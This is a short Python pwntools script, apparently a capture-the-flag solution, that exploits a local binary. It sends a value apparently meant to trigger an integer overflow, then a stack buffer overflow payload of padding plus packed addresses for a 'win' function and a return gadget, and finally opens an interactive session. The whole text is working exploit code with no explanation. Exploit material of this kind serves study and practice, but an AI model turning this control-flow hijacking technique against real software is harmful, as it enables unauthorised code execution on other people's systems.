from pwn import *
from time import sleep as w

p = process(sys.argv[1])
off = 144-(8*2)
int_ov = 255
win = 0x4039b0 # win
p.sendline(str(int_ov))
ret =0x0000000000403b58
w(0.01)
#gdb.attach(p)
p.sendline(b"A"*off+p64(win)+p64(ret)) # + b"B"*8)
p.interactive()
